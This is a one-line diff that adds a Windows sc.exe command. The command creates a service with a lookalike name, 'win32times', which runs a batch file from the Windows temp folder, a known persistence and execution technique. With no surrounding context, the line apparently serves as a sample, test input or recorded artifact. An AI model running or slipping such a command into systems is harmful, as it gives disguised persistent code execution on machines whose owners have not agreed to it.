@@ -1,0 +1,1 @@
+cmd.exe /c sc \\localhost create "win32times" binPath="cmd /c start c:\windows\temp\x.bat"
